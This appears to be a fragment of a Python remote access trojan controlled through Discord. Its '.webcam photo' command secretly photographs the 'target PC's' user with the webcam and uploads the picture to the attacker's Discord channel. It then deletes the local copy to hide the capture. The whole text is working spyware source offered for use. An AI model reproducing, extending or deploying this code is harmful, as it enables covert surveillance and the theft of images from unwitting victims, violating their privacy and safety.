import pygame.camera
import pygame.image
import subprocess
import time
# end of imports

# on message
elif message.content[:7] == '.webcam':
    await message.delete()
    if message.content.strip() == '.webcam':
        reaction_msg = await message.channel.send(
            '```Syntax: .webcam <action>\nActions:\n    photo - take a photo with target PC\'s webcam```')
        await reaction_msg.add_reaction('🔴')
    else:
        if message.content[8:] == 'photo':
            pygame.camera.init()
            cameras = pygame.camera.list_cameras()

            if not cameras:
                reaction_msg = await message.channel.send('No cameras found.')
                await reaction_msg.add_reaction('🔴')
                return

            camera = pygame.camera.Camera(cameras[0])
            camera.start()
            time.sleep(0.5) # let camera initialise to avoid black screen

            image = camera.get_image()

            camera.stop()

            pygame.image.save(image, f'C:\\Users\\{getuser()}\\{software_directory_name}\\webcam.png')

            reaction_msg = await message.channel.send(
                embed=discord.Embed(title=current_time(True) + ' `[On demand]`')
                .set_image(url='attachment://webcam.png'),
                file=discord.File(f'C:\\Users\\{getuser()}\\{software_directory_name}\\webcam.png'))
            await reaction_msg.add_reaction('📌')

            subprocess.run(f'del C:\\Users\\{getuser()}\\{software_directory_name}\\webcam.png', shell=True)

        else:
            reaction_msg = await message.channel.send('```Syntax: .webcam <action>\nActions:\n    photo - take a photo with target PC\'s webcam```')
            await reaction_msg.add_reaction('🔴')
